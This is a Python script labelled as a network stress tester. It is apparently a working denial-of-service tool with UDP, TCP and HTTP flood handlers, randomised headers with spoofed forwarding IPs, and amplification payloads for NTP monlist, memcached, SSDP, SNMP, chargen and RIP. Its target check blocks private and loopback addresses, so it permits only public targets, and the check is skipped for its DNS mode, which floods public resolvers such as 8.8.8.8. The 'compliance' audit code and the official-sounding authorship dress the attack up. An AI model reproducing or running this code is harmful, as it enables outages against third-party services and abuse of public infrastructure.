#!/usr/bin/env python3
"""
ULTRA-NET-STRESS v5.0 - Enhanced Non-Root Edition
Author: Cyber Defense Unit, Joint Task Force Sigma
Classification: INTERNAL USE ONLY
"""

import os
import sys
import time
import random
import socket
import struct
import asyncio
import argparse
import logging
import ipaddress
import resource
import hashlib
import json
import zlib
import ssl
import threading
import traceback
import selectors
from datetime import datetime
from typing import List, Tuple, Dict, Optional, Union, Callable

# --- Global Constants ---
MAX_PACKET_SIZE = 65507
MAX_CONCURRENCY = 2048
MAX_DURATION = 86400
TERMUX_MAX_FDS = 1024
VERSION = "5.0.0"
COMPLIANCE_ID = hashlib.sha256(b"AHJ49QWE-Actos53").hexdigest()[:16]
DEFAULT_DNS_RESOLVERS = [
    '8.8.8.8', '8.8.4.4', 
    '1.1.1.1', '1.0.0.1',
    '9.9.9.9', '149.112.112.112'
]
AMPLIFICATION_VECTORS = ['dns', 'ntp', 'ssdp', 'chargen', 'memcached', 'snmp', 'rip']
HTTP_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] [%(module)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("netstress_audit.log")
    ]
)
logger = logging.getLogger("ULTRA-NET-STRESS")

# --- Compliance Framework ---
class ComplianceEngine:
    AUDIT_FILE = "netstress_compliance_audit.log"

    @staticmethod
    def generate_compliance_id(target: str) -> str:
        timestamp = int(time.time())
        return f"{COMPLIANCE_ID}-{timestamp}-{target}"

    @staticmethod
    def audit_action(action: str, details: Dict):
        audit_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "action": action,
            "compliance_id": COMPLIANCE_ID,
            "details": details,
            "signature": hashlib.sha256(
                f"{action}{json.dumps(details)}{COMPLIANCE_ID}".encode()
            ).hexdigest()
        }
        try:
            with open(ComplianceEngine.AUDIT_FILE, "a") as f:
                f.write(json.dumps(audit_entry) + "\n")
        except IOError as e:
            logger.error(f"Compliance audit trail failed: {str(e)}")

    @staticmethod
    def validate_target(ip: str, port: int) -> bool:
        try:
            addr = ipaddress.ip_address(ip)
            if addr.is_private or addr.is_loopback or addr.is_reserved:
                logger.error("Target IP is in prohibited range")
                return False
            if not (1 <= port <= 65535):
                logger.error("Port out of legal range")
                return False
            return True
        except ValueError:
            logger.error("Invalid IP address format")
            return False

# --- Enhanced DNS Implementation ---
class DNSUtils:
    @staticmethod
    def build_dns_query(domain: str, query_type: str = "ANY") -> bytes:
        transaction_id = random.randint(1, 65535)
        flags = 0x0100 | 0x0200  # Standard query + Recursion desired
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0

        header = struct.pack('!HHHHHH', transaction_id, flags, questions, 
                           answer_rrs, authority_rrs, additional_rrs)

        qname = b''
        for part in domain.split('.'):
            qname += bytes([len(part)]) + part.encode()
        qname += b'\x00'

        qtype_map = {
            "A": 1, "AAAA": 28, "MX": 15, "TXT": 16, "ANY": 255, 
            "SRV": 33, "NS": 2, "SOA": 6, "CNAME": 5
        }
        qtype = qtype_map.get(query_type.upper(), 1)
        qclass = 1  # IN (Internet)

        question = qname + struct.pack('!HH', qtype, qclass)
        return header + question

# --- Enhanced Protocol Handlers ---
class ProtocolHandler:
    def __init__(self, target_ip: str, target_port: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.stop_event = threading.Event()
        self.packet_counter = 0
        self.byte_counter = 0
        self.start_time = time.monotonic()
        self.intensity_factor = 1.0
        self.attack_pattern = 0  # 0: steady, 1: burst, 2: wave

    def stop(self):
        self.stop_event.set()

    def get_stats(self) -> Dict:
        return {
            "packets": self.packet_counter,
            "bytes": self.byte_counter,
            "duration": time.monotonic() - self.start_time,
            "intensity": self.intensity_factor,
            "pattern": self.attack_pattern
        }

    def increase_intensity(self, factor: float = 1.1):
        """Progressively increase attack intensity with pattern variation"""
        self.intensity_factor = min(15.0, self.intensity_factor * factor)
        
        # Cycle through attack patterns
        self.attack_pattern = (self.attack_pattern + 1) % 3
        return self.intensity_factor

    def get_pattern_multiplier(self) -> int:
        """Return multiplier based on current attack pattern"""
        if self.attack_pattern == 0:  # Steady
            return int(self.intensity_factor)
        elif self.attack_pattern == 1:  # Burst
            return int(self.intensity_factor * random.uniform(0.5, 2.0))
        else:  # Wave
            wave = (time.monotonic() % 10) / 10
            return int(self.intensity_factor * (0.5 + 1.5 * abs(wave - 0.5)))

    async def send(self):
        raise NotImplementedError("Subclasses must implement send method")

class UDPFloodHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int, 
                 packet_size: int = 1024, use_ipv6: bool = False,
                 amplification: bool = False, amp_vector: str = 'dns'):
        super().__init__(target_ip, target_port)
        self.packet_size = min(packet_size, MAX_PACKET_SIZE)
        self.use_ipv6 = use_ipv6
        self.amplification = amplification
        self.amp_vector = amp_vector
        self.sockets = self._create_sockets()
        self.current_socket = 0

    def _create_sockets(self) -> list:
        """Create multiple sockets for parallel sending"""
        sockets = []
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        
        for _ in range(8):  # Multiple sockets for better performance
            sock = socket.socket(family, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
            except:
                pass
                
            sockets.append(sock)
            
        return sockets

    def _generate_dns_payload(self) -> bytes:
        domains = ["example.com", "google.com", "amazon.com", "microsoft.com", "cloudflare.com"]
        query_types = ["ANY", "A", "AAAA", "MX", "TXT"]
        return DNSUtils.build_dns_query(random.choice(domains), random.choice(query_types))

    def _generate_ntp_payload(self) -> bytes:
        # Multiple NTP amplification vectors
        ntp_commands = [
            bytearray.fromhex("1703002a00000000000000000000000000000000000000000000000000000000000000000000000000000000"),  # monlist
            bytearray.fromhex("1b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"),  # peers
            bytearray.fromhex("1703002a" + "00"*40)  # Variant
        ]
        return random.choice(ntp_commands)

    def _generate_ssdp_payload(self) -> bytes:
        search_targets = ["ssdp:all", "upnp:rootdevice", "urn:schemas-upnp-org:device:MediaServer:1"]
        return (
            f"M-SEARCH * HTTP/1.1\r\n"
            f"Host: 239.255.255.250:1900\r\n"
            f"Man: \"ssdp:discover\"\r\n"
            f"MX: {random.randint(1,5)}\r\n"
            f"ST: {random.choice(search_targets)}\r\n"
            f"\r\n"
        ).encode()

    def _generate_chargen_payload(self) -> bytes:
        return random.choice([
            b"\x01" + os.urandom(random.randint(50, 500)),
            b"\x02" + b"A" * random.randint(100, 1000),
            b"\x03" + b"TEST" * random.randint(25, 250)
        ])

    def _generate_memcached_payload(self) -> bytes:
        commands = [
            b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n",
            b"\x00\x00\x00\x00\x00\x01\x00\x00stats slabs\r\n",
            b"\x00\x00\x00\x00\x00\x01\x00\x00stats items\r\n"
        ]
        return random.choice(commands)

    def _generate_snmp_payload(self) -> bytes:
        """SNMP amplification payload"""
        return bytearray.fromhex("302602010004067075626c6963a0190204575d1b6f020100020100300b300906052b060102010500")

    def _generate_rip_payload(self) -> bytes:
        """RIP amplification payload"""
        return bytearray.fromhex("02020000000000000000000000000000000000000000000000000000000000000000000000000000")

    def generate_payload(self) -> bytes:
        if self.amplification:
            if self.amp_vector == 'dns':
                return self._generate_dns_payload()
            elif self.amp_vector == 'ntp':
                return self._generate_ntp_payload()
            elif self.amp_vector == 'ssdp':
                return self._generate_ssdp_payload()
            elif self.amp_vector == 'chargen':
                return self._generate_chargen_payload()
            elif self.amp_vector == 'memcached':
                return self._generate_memcached_payload()
            elif self.amp_vector == 'snmp':
                return self._generate_snmp_payload()
            elif self.amp_vector == 'rip':
                return self._generate_rip_payload()
        
        # Regular UDP flood with variable payloads
        patterns = [
            os.urandom(self.packet_size),
            b"\x00" * self.packet_size,
            b"\xFF" * self.packet_size,
            bytes([random.randint(0, 255) for _ in range(self.packet_size)])
        ]
        return random.choice(patterns)

    async def send(self):
        payload = self.generate_payload()
        target = (self.target_ip, self.target_port)
        loop = asyncio.get_running_loop()

        while not self.stop_event.is_set():
            try:
                # Rotate through sockets for load balancing
                sock = self.sockets[self.current_socket]
                self.current_socket = (self.current_socket + 1) % len(self.sockets)
                
                # Send multiple packets based on pattern
                multiplier = self.get_pattern_multiplier()
                for _ in range(max(1, multiplier)):
                    await loop.sock_sendto(sock, payload, target)
                    self.packet_counter += 1
                    self.byte_counter += len(payload)

                # Dynamic intensity adjustment
                if random.random() < 0.015:
                    self.increase_intensity(random.uniform(1.05, 1.3))
                    
                # Small delay to prevent complete CPU saturation
                if multiplier > 5:
                    await asyncio.sleep(0.001)

            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.01)

class TCPAdvancedHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int, use_ipv6: bool = False):
        super().__init__(target_ip, target_port)
        self.use_ipv6 = use_ipv6
        self.connection_pool = []
        self.max_pool_size = 100
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

    async def _create_connection(self, use_ssl: bool = False):
        """Create and maintain persistent connections with SSL support"""
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        
        try:
            if use_ssl:
                reader, writer = await asyncio.open_connection(
                    self.target_ip, self.target_port,
                    ssl=self.ssl_context,
                    family=family
                )
            else:
                reader, writer = await asyncio.open_connection(
                    self.target_ip, self.target_port,
                    family=family
                )
            return (reader, writer)
        except Exception as e:
            return None

    async def send(self):
        connection_attempts = 0
        max_attempts = self.max_pool_size * 2

        while not self.stop_event.is_set():
            try:
                # Maintain connection pool
                if len(self.connection_pool) < min(self.max_pool_size, self.get_pattern_multiplier()):
                    use_ssl = random.choice([True, False])
                    conn = await self._create_connection(use_ssl)
                    if conn:
                        self.connection_pool.append(conn)
                    connection_attempts += 1

                # Send data through random connections
                if self.connection_pool:
                    for _ in range(min(len(self.connection_pool), self.get_pattern_multiplier())):
                        reader, writer = random.choice(self.connection_pool)
                        try:
                            # Varied TCP payloads
                            payloads = [
                                b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\n\r\n",
                                b"POST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n",
                                b"HEAD / HTTP/1.1\r\n\r\n",
                                os.urandom(random.randint(16, 256))
                            ]
                            
                            payload = random.choice(payloads)
                            writer.write(payload)
                            await writer.drain()
                            
                            self.packet_counter += 1
                            self.byte_counter += len(payload)
                            
                        except Exception as e:
                            self.connection_pool.remove((reader, writer))
                            try:
                                writer.close()
                                await writer.wait_closed()
                            except:
                                pass

                # Progressive intensity and pool management
                if random.random() < 0.01:
                    new_intensity = self.increase_intensity()
                    self.max_pool_size = min(500, int(100 * new_intensity))

                # Clean up dead connections periodically
                if random.random() < 0.05 and self.connection_pool:
                    try:
                        reader, writer = random.choice(self.connection_pool)
                        writer.write(b' ')
                        await writer.drain()
                    except:
                        self.connection_pool.remove((reader, writer))

                await asyncio.sleep(0.01)

            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.1)

class HTTPAdvancedHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int, use_ssl: bool = False):
        super().__init__(target_ip, target_port)
        self.use_ssl = use_ssl
        self.connection_pool = []
        self.max_pool_size = 50
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self.paths = ["/", "/index.html", "/api/v1/test", "/wp-admin", "/admin", 
                     "/static/js/main.js", "/images/logo.png", "/css/style.css"]

    def _generate_headers(self) -> str:
        headers = [
            f"User-Agent: {random.choice(HTTP_USER_AGENTS)}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Connection: keep-alive",
            "Cache-Control: no-cache, no-store, must-revalidate",
            "Pragma: no-cache",
            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            f"X-Real-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Requested-With: XMLHttpRequest"
        ]
        return "\r\n".join(headers) + "\r\n"

    def generate_request(self, method: str = "GET") -> bytes:
        path = random.choice(self.paths)
        return (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {self.target_ip}:{self.target_port}\r\n"
            f"{self._generate_headers()}"
            f"Content-Length: 0\r\n\r\n"
        ).encode()

    async def _create_connection(self):
        try:
            if self.use_ssl:
                reader, writer = await asyncio.open_connection(
                    self.target_ip, self.target_port,
                    ssl=self.ssl_context
                )
            else:
                reader, writer = await asyncio.open_connection(
                    self.target_ip, self.target_port
                )
            return (reader, writer)
        except:
            return None

    async def send(self):
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
        request_variants = [self.generate_request(m) for m in methods]

        while not self.stop_event.is_set():
            try:
                # Maintain connection pool
                if len(self.connection_pool) < min(self.max_pool_size, self.get_pattern_multiplier()):
                    conn = await self._create_connection()
                    if conn:
                        self.connection_pool.append(conn)

                # Send requests through pooled connections
                if self.connection_pool:
                    for _ in range(min(len(self.connection_pool), self.get_pattern_multiplier())):
                        reader, writer = random.choice(self.connection_pool)
                        try:
                            request = random.choice(request_variants)
                            writer.write(request)
                            await writer.drain()
                            
                            self.packet_counter += 1
                            self.byte_counter += len(request)
                            
                            # Try to read response to keep connection alive
                            try:
                                await asyncio.wait_for(reader.read(1024), timeout=0.1)
                            except:
                                pass
                                
                        except Exception as e:
                            self.connection_pool.remove((reader, writer))
                            try:
                                writer.close()
                                await writer.wait_closed()
                            except:
                                pass

                # Progressive intensity scaling
                if random.random() < 0.015:
                    new_intensity = self.increase_intensity()
                    self.max_pool_size = min(200, int(50 * new_intensity))

                await asyncio.sleep(0.01)

            except (OSError, asyncio.CancelledError, ssl.SSLError):
                await asyncio.sleep(0.1)

class DNSAmplificationHandler(ProtocolHandler):
    def __init__(self, target_ip: str, target_port: int,
                 dns_servers: List[str] = None, 
                 domain: str = "example.com", query_type: str = "ANY"):
        super().__init__(target_ip, target_port)
        self.dns_servers = dns_servers or DEFAULT_DNS_RESOLVERS
        self.domain = domain
        self.query_type = query_type
        self.sockets = self._create_sockets()
        self.queries = self._generate_query_variants()

    def _create_sockets(self) -> list:
        """Create multiple sockets for parallel amplification"""
        sockets = []
        for _ in range(16):  # More sockets for DNS amplification
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setblocking(False)
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
            except:
                pass
            sockets.append(sock)
        return sockets

    def _generate_query_variants(self) -> list:
        """Generate multiple query variants for better amplification"""
        domains = [
            "example.com", "google.com", "yahoo.com", "amazon.com", 
            "microsoft.com", "cloudflare.com", "facebook.com", "twitter.com"
        ]
        query_types = ["ANY", "A", "AAAA", "MX", "TXT", "SRV", "NS"]
        
        queries = []
        for domain in domains:
            for qtype in query_types:
                queries.append(DNSUtils.build_dns_query(domain, qtype))
        
        return queries

    async def send(self):
        loop = asyncio.get_running_loop()

        while not self.stop_event.is_set():
            try:
                # Send multiple queries based on intensity
                multiplier = self.get_pattern_multiplier()
                for _ in range(multiplier):
                    sock = random.choice(self.sockets)
                    dns_server = random.choice(self.dns_servers)
                    query = random.choice(self.queries)
                    
                    await loop.sock_sendto(sock, query, (dns_server, 53))
                    self.packet_counter += 1
                    self.byte_counter += len(query)

                # Dynamic intensity adjustment
                if random.random() < 0.02:
                    self.increase_intensity(random.uniform(1.1, 1.5))
                    
                # Small delay to avoid complete saturation
                if multiplier > 8:
                    await asyncio.sleep(0.001)

            except (OSError, asyncio.CancelledError):
                await asyncio.sleep(0.01)

# --- Enhanced Main Stress Engine ---
class UltraNetStressEnhanced:
    def __init__(self, 
                 target_ip: str, 
                 target_port: int, 
                 attack_type: str = "udp",
                 duration: int = 0,
                 threads: int = 100,
                 packet_size: int = 1024,
                 use_ipv6: bool = False,
                 amplification: bool = False,
                 amp_vector: str = "dns",
                 dns_servers: List[str] = None,
                 ssl_enabled: bool = False,
                 query_type: str = "ANY"):

        if not ComplianceEngine.validate_target(target_ip, target_port) and attack_type != "dns":
            raise ValueError("Target validation failed")

        self.compliance_id = ComplianceEngine.generate_compliance_id(f"{target_ip}:{target_port}")
        ComplianceEngine.audit_action("init", {
            "target": f"{target_ip}:{target_port}",
            "attack_type": attack_type,
            "threads": threads,
            "amplification": amplification,
            "amp_vector": amp_vector,
            "packet_size": packet_size
        })

        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_type = attack_type.lower()
        self.duration = duration
        self.threads = min(threads, MAX_CONCURRENCY, TERMUX_MAX_FDS // 2)
        self.packet_size = packet_size
        self.use_ipv6 = use_ipv6
        self.amplification = amplification
        self.amp_vector = amp_vector.lower()
        self.dns_servers = dns_servers or DEFAULT_DNS_RESOLVERS
        self.ssl_enabled = ssl_enabled
        self.query_type = query_type

        self.start_time = time.monotonic()
        self.stop_event = asyncio.Event()
        self.workers = []
        self.stats_task = None
        self.handlers = []
        self.performance_stats = {
            "peak_pps": 0,
            "peak_bps": 0,
            "total_connections": 0
        }

        self._init_handlers()

    def _init_handlers(self):
        if self.attack_type == "udp":
            self.handlers = [UDPFloodHandler(
                self.target_ip, self.target_port,
                self.packet_size, self.use_ipv6,
                self.amplification, self.amp_vector
            )]
        elif self.attack_type == "tcp":
            self.handlers = [TCPAdvancedHandler(
                self.target_ip, self.target_port, self.use_ipv6
            )]
        elif self.attack_type == "http":
            self.handlers = [HTTPAdvancedHandler(
                self.target_ip, self.target_port, self.ssl_enabled
            )]
        elif self.attack_type == "dns":
            self.handlers = [DNSAmplificationHandler(
                self.target_ip, self.target_port,
                self.dns_servers, "example.com", self.query_type
            )]
        elif self.attack_type == "multi":
            self.handlers = [
                UDPFloodHandler(self.target_ip, self.target_port, self.packet_size),
                TCPAdvancedHandler(self.target_ip, self.target_port, self.use_ipv6),
                HTTPAdvancedHandler(self.target_ip, self.target_port, self.ssl_enabled),
                DNSAmplificationHandler(self.target_ip, self.target_port, self.dns_servers)
            ]
        else:
            raise ValueError(f"Unsupported attack type: {self.attack_type}")

    async def attack_worker(self, worker_id: int):
        handler = random.choice(self.handlers)
        try:
            while not self.stop_event.is_set():
                await handler.send()
        except Exception as e:
            logger.error(f"Worker {worker_id} failed: {str(e)}")

    async def stats_reporter(self):
        last_time = time.monotonic()
        last_packets = sum(h.packet_counter for h in self.handlers)
        last_bytes = sum(h.byte_counter for h in self.handlers)

        while not self.stop_event.is_set():
            await asyncio.sleep(1.0)

            current_packets = sum(h.packet_counter for h in self.handlers)
            current_bytes = sum(h.byte_counter for h in self.handlers)
            now = time.monotonic()
            elapsed = now - last_time

            if elapsed > 0:
                pps = (current_packets - last_packets) / elapsed
                bps = (current_bytes - last_bytes) * 8 / elapsed
                
                # Update peak performance stats
                self.performance_stats["peak_pps"] = max(self.performance_stats["peak_pps"], pps)
                self.performance_stats["peak_bps"] = max(self.performance_stats["peak_bps"], bps)
            else:
                pps = 0
                bps = 0

            intensity = sum(h.intensity_factor for h in self.handlers) / len(self.handlers)
            pattern_names = ["Steady", "Burst", "Wave"]
            current_pattern = pattern_names[self.handlers[0].attack_pattern] if self.handlers else "N/A"

            sys.stdout.write(
                f"\r[STATS] Packets: {current_packets:,} | "
                f"Data: {current_bytes / (1024*1024):.2f} MB | "
                f"PPS: {pps:,.1f} | BPS: {bps / 1e6:.2f} Mbps | "
                f"Intensity: {intensity:.2f}x | "
                f"Pattern: {current_pattern} | "
                f"Workers: {len(self.workers)}       "
            )
            sys.stdout.flush()

            last_time = now
            last_packets = current_packets
            last_bytes = current_bytes

    async def resource_manager(self):
        """Manage system resources and adjust parameters dynamically"""
        while not self.stop_event.is_set():
            await asyncio.sleep(5.0)
            
            # Adjust intensity based on performance
            current_pps = self.performance_stats["peak_pps"]
            if current_pps < 1000:  # Low performance
                for handler in self.handlers:
                    handler.increase_intensity(1.5)
            elif current_pps > 10000:  # High performance, maintain
                pass

    async def run(self):
        logger.info(f"Starting UltraNetStress Enhanced v{VERSION}")
        logger.info(f"Target: {self.target_ip}:{self.target_port}")
        logger.info(f"Attack: {self.attack_type}, Threads: {self.threads}")
        if self.amplification:
            logger.info(f"Amplification: {self.amp_vector.upper()}")

        # Start workers
        for i in range(self.threads):
            worker = asyncio.create_task(self.attack_worker(i))
            self.workers.append(worker)

        # Start monitoring tasks
        self.stats_task = asyncio.create_task(self.stats_reporter())
        self.resource_task = asyncio.create_task(self.resource_manager())

        # Set duration timer if specified
        if self.duration > 0:
            await asyncio.sleep(self.duration)
            await self.stop()
        else:
            # Wait for stop signal
            try:
                await self.stop_event.wait()
            except asyncio.CancelledError:
                await self.stop()

    async def stop(self):
        self.stop_event.set()
        
        # Stop all handlers
        for handler in self.handlers:
            handler.stop()
        
        # Cancel all tasks
        if self.stats_task:
            self.stats_task.cancel()
        if self.resource_task:
            self.resource_task.cancel()
        
        for worker in self.workers:
            worker.cancel()
        
        # Wait for tasks to complete
        await asyncio.gather(*self.workers, return_exceptions=True)
        
        # Final stats report
        total_packets = sum(h.packet_counter for h in self.handlers)
        total_bytes = sum(h.byte_counter for h in self.handlers)
        duration = time.monotonic() - self.start_time
        
        logger.info(f"\nAttack completed. Total packets: {total_packets:,}")
        logger.info(f"Total data: {total_bytes / (1024*1024):.2f} MB")
        logger.info(f"Duration: {duration:.2f}s, Average PPS: {total_packets/duration:.1f}")
        logger.info(f"Peak PPS: {self.performance_stats['peak_pps']:,.1f}")
        logger.info(f"Peak BPS: {self.performance_stats['peak_bps'] / 1e6:.2f} Mbps")
        
        ComplianceEngine.audit_action("stop", {
            "total_packets": total_packets,
            "total_bytes": total_bytes,
            "duration": duration,
            "peak_pps": self.performance_stats["peak_pps"],
            "peak_bps": self.performance_stats["peak_bps"]
        })

def main():
    parser = argparse.ArgumentParser(description="UltraNetStress Enhanced - Advanced Network Stress Testing")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads (default: 100)")
    parser.add_argument("-d", "--duration", type=int, default=0, help="Attack duration in seconds (0 = unlimited)")
    parser.add_argument("-a", "--attack", choices=["udp", "tcp", "http", "dns", "multi"], 
                       default="udp", help="Attack type (default: udp)")
    parser.add_argument("--amplification", action="store_true", help="Enable amplification attack")
    parser.add_argument("--amp-vector", choices=AMPLIFICATION_VECTORS, default="dns", 
                       help="Amplification vector (default: dns)")
    parser.add_argument("--packet-size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
    parser.add_argument("--ipv6", action="store_true", help="Use IPv6")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("--dns-servers", nargs="+", default=DEFAULT_DNS_RESOLVERS, 
                       help="DNS servers for amplification")
    parser.add_argument("--query-type", default="ANY", 
                       choices=["ANY", "A", "AAAA", "MX", "TXT", "SRV", "NS"], help="DNS query type")
    
    args = parser.parse_args()
    
    try:
        stress_test = UltraNetStressEnhanced(
            target_ip=args.target,
            target_port=args.port,
            attack_type=args.attack,
            duration=args.duration,
            threads=args.threads,
            packet_size=args.packet_size,
            use_ipv6=args.ipv6,
            amplification=args.amplification,
            amp_vector=args.amp_vector,
            dns_servers=args.dns_servers,
            ssl_enabled=args.ssl,
            query_type=args.query_type
        )
        
        asyncio.run(stress_test.run())
        
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
    except Exception as e:
        logger.error(f"Attack failed: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    # Enhanced non-root operation
    main()
